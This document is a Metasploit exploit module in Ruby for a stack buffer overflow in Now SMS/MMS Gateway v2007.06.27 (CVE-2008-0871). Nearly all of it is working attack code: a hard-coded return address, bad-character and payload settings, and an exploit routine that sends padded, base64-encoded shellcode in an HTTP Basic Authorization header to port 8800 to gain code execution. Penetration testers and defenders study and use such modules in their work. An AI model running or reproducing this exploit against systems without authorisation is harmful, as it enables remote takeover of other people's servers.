##
# $Id: nowsms.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Now SMS/MMS Gateway Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Now SMS/MMS Gateway v2007.06.27.
				By sending a specially crafted GET request, an attacker may be able to execute
				arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'CVE', '2008-0871' ],
					[ 'OSVDB', '42953'],
					[ 'BID', '27896' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 0x94,
					'BadChars' => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c&=+?:;-,/#.\\$%\x1a",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Now SMS/MMS Gateway v2007.06.27', { 'Ret' => 0x10002f9d } ], # CALL ESP : SMSHMAC.DLL
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Feb 19 2008'))

		register_options( [ Opt::RPORT(8800) ], self.class )
	end

	def exploit
		c = connect

		data = Rex::Text.encode_base64(rand_text_english(129) + [target.ret].pack('V') + payload.encoded)

		print_status("Trying target #{target.name}...")

		res = send_request_raw({
				'uri'          => '/',
				'method'       => 'GET',
				'headers'      =>
				{
					'Authorization' => "Basic #{Rex::Text.encode_base64(data)}"
				}
			}, 5)

		handler
	end

end